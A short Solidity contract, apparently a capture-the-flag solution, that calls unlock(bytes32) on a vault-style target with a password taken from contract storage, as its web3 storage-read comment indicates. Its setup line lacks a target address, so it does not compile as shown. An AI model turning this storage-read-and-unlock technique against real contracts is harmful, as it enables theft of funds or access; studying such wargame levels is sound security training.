// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attack {

    Instance instance = Instance();

    function attack2(bytes32 pw) public {
        
        (bool success, ) = address(instance).call(abi.encodeWithSignature("unlock(bytes32)", pw));
        require(success, "unlock failed");
    }    

}

//web3.eth.storageAt('', 1)